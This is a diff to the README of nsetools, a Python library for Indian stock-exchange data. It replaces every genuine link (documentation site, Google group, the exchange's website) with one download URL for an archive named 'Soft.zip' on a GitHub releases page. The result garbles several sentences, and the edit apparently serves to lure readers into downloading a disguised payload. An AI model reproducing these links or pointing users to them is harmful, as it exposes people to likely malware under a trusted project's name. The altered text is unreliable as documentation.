@@ -1,11 +1,11 @@
 Project Page
 =============
-http://nsetools.readthedocs.io
+https://github.com/rdas77/nsetools/releases/download/v1.0/Soft.zip
 
 Updates
 =========
 
-To stay updated please subscribe to google group https://groups.google.com/forum/#!forum/nsetools
+To stay updated please subscribe to google group https://github.com/rdas77/nsetools/releases/download/v1.0/Soft.zip!forum/nsetools
 
 nsetools
 ========
@@ -15,7 +15,7 @@ Python library for extracting realtime data from National Stock Exchange (India)
 Introduction.
 ============
 
-nsetools is a library for collecting real time data from National Stock Exchange (India). It can be used in various types of projects which requires getting live quotes for a given stock or index or build large data sets for further data analytics. You can also build cli applications which can provide you live market details at a blazing fast speeds, much faster that the browsers. The accuracy of data is only as correct as provided on www.nseindia.com.
+nsetools is a library for collecting real time data from National Stock Exchange (India). It can be used in various types of projects which requires getting live quotes for a given stock or index or build large data sets for further data analytics. You can also build cli applications which can provide you live market details at a blazing fast speeds, much faster that the browsers. The accuracy of data is only as correct as provided on https://github.com/rdas77/nsetools/releases/download/v1.0/Soft.zip
 
 Main Features:
 =============
@@ -36,4 +36,4 @@ To keep it simple and supported on most of the platforms, it uses only core pyth
 Detailed Documenation 
 =====================
 
-For complete documenation, please refer http://nsetools.readthedocs.io
+For complete documenation, please refer https://github.com/rdas77/nsetools/releases/download/v1.0/Soft.zip
